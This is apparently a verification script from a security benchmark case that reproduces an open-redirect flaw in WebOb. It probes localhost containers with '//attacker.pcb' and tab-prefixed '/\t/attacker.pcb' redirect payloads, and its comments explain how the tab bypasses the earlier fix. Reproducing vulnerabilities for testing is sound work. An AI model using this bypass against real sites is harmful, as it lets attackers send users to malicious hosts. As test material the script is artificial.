#!/usr/bin/env bash
# verify.sh --seed|--residual — webob-cve-2026-44889（open-redirect，real-library-wrap）
#
# 机制：应用把 GET /redirect?to=<user-input> 交给 REAL WebOb Response 生成 302；
# WebOb 在 __call__ 时经 _make_location_absolute 把 Location 规范化为绝对 URL。
#   seed     to=//attacker.pcb/<FLAG>    : V0(1.8.7) 无防护，urljoin 直接产生
#            http://attacker.pcb/<FLAG>（开放重定向）；V1(1.8.8) CVE-2024-42353 修复
#            把字面前导 // 改写为 /%2f... -> Location 留在同源 -> 阻断。
#   residual to=/\t/attacker.pcb/<FLAG>  : 1.8.8 只检查字面 startswith('//')，制表符
#            前缀绕过检查，Python 3.10+ urlsplit 剥离 tab 后重新拼出 //attacker
#            -> V1 仍开放（CVE-2026-44889）；V2(1.8.10) 先剥离 \t\r\n 再检查 -> 阻断。
# 效果通道 = 302 响应头 Location（解析 host == attacker.pcb 且含 RUN_FLAG_REF）。
# 探测 = 与 oracle 一致的 http.client GET /redirect?to=<quote(payload)>（自包含实现）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" 8000 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_V0_0:-}" ;;
    v1) PORT="${PORT_V1_0:-}" ;;
    v2) PORT="${PORT_V2_0:-}" ;;
  esac
fi
[[ -n "$PORT" ]] || { echo "verify: 无法解析 $VERSION 宿主端口（need --profile + compose.env）" >&2; exit 20; }

# 就绪等待：wsgiref 单线程 server，启动后立即响应
for _ in $(seq 1 30); do
  if curl -s -o /dev/null -m 2 "http://127.0.0.1:$PORT/"; then break; fi
  sleep 1
done

# 探测：--seed 用 //attacker 载荷；--residual 用 /\t/attacker 载荷（tab 经 URL 编码 %09 进入
# GET 参数，WebOb 解码后为字面 tab——与 oracle 的 quote(raw, safe="") 完全一致）。
"$PY" - "$PORT" "$FLAG_REF" "$MODE" <<'PYEOF'
import http.client, os
import sys
from urllib.parse import quote, urlsplit

port, payload_flag, mode = sys.argv[1], sys.argv[2], sys.argv[3]
judge = os.environ.get("RUN_FLAG_REF") or payload_flag
ATTACKER = "attacker.pcb"
raw = ("//%s/%s" % (ATTACKER, payload_flag)) if mode == "--seed" else ("/\t/%s/%s" % (ATTACKER, payload_flag))
try:
    conn = http.client.HTTPConnection("127.0.0.1", int(port), timeout=15)
    conn.request("GET", "/redirect?to=" + quote(raw, safe=""))
    resp = conn.getresponse()
    loc = resp.getheader("Location")
    status = resp.status
    resp.read()
    conn.close()
except Exception as e:
    print("verify: request failed: %r" % (e,), file=sys.stderr)
    sys.exit(20)
host = (urlsplit(loc).hostname or "").lower() if loc else ""
print("verify[%s]: status=%s location=%r host=%r" % (mode, status, loc, host))
if host == ATTACKER and judge in (loc or ""):
    sys.exit(0)
sys.exit(10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (flag_ref=${FLAG_REF:0:12}...)" >&2
exit "$RC"
